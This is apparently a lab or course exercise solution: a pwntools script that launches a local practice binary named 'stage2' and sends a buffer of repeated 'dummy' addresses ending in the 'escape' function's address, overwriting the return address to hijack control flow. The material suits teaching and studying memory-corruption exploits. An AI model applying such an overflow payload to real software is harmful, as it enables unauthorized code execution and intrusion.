import sys
from pwn import *
import time
import re

# target = './out/stage2-2020310404'
target = './stage2'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p


# Receive output from program and print it in ASCII
output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
escape = context.binary.symbols['escape']
dummy = context.binary.symbols['dummy']
input = p64(dummy)
input += p64(dummy)
input += p64(dummy)
input += p64(dummy)
input += p64(dummy)
input += p64(dummy)
input += p64(escape)
####################################################
# Send input to program

io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))

